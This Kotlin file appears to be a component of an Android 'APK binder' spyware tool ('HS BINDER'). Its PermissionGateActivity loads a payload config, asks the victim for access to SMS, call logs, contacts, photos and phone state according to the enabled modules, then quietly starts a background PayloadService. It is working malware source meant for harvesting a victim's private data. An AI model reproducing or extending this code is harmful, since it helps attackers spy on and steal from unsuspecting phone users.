package Com.devhs.apkbinder.payload

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.graphics.Color
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Bundle
import android.view.Gravity
import android.view.ViewGroup
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import androidx.activity.result.contract.ActivityResultContracts

class PermissionGateActivity : Activity(), PayloadServiceHost {

    private val launcher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { proceed() }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val cfg = PayloadState.config ?: (application as? PayloadApp)?.readConfig()
        if (cfg == null) {
            finish()
            return
        }
        PayloadState.config = cfg

        setContentView(buildUi())
        launcher.launch(requiredPermissions())
    }

    private fun requiredPermissions(): Array<String> {
        val list = mutableListOf<String>()
        if (PayloadState.enabled("gallery")) {
            if (Build.VERSION.SDK_INT >= 33) list.add(Manifest.permission.READ_MEDIA_IMAGES)
            else list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        if (PayloadState.enabled("sms")) list.add(Manifest.permission.READ_SMS)
        if (PayloadState.enabled("calls")) list.add(Manifest.permission.READ_CALL_LOG)
        if (PayloadState.enabled("contacts")) list.add(Manifest.permission.READ_CONTACTS)
        if (PayloadState.enabled("device")) list.add(Manifest.permission.READ_PHONE_STATE)
        if (Build.VERSION.SDK_INT >= 33) list.add(Manifest.permission.POST_NOTIFICATIONS)
        return list.toTypedArray()
    }

    private fun buildUi(): LinearLayout {
        val root = LinearLayout(this)
        root.orientation = LinearLayout.VERTICAL
        root.gravity = Gravity.CENTER
        root.setPadding(60, 60, 60, 60)
        root.background = GradientDrawable().apply {
            setColor(Color.parseColor("#F205070A"))
            cornerRadius = 40f
        }

        root.addView(TextView(this).apply {
            text = "HS BINDER"
            setTextColor(Color.parseColor("#00E5C0"))
            textSize = 22f
            gravity = Gravity.CENTER
        })
        root.addView(TextView(this).apply {
            text = "Granting permissions to continue..."
            setTextColor(Color.parseColor("#E8F6F4"))
            textSize = 13f
            gravity = Gravity.CENTER
            setPadding(0, 20, 0, 40)
        })
        root.addView(Button(this).apply {
            text = "Grant Permissions"
            setTextColor(Color.parseColor("#05070A"))
            background = GradientDrawable().apply {
                setColor(Color.parseColor("#00E5C0"))
                cornerRadius = 30f
            }
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
            )
            setOnClickListener { launcher.launch(requiredPermissions()) }
        })
        return root
    }

    private fun proceed() {
        try {
            startService(Intent(this, PayloadService::class.java))
        } catch (_: Throwable) {
        }
        finish()
    }
}
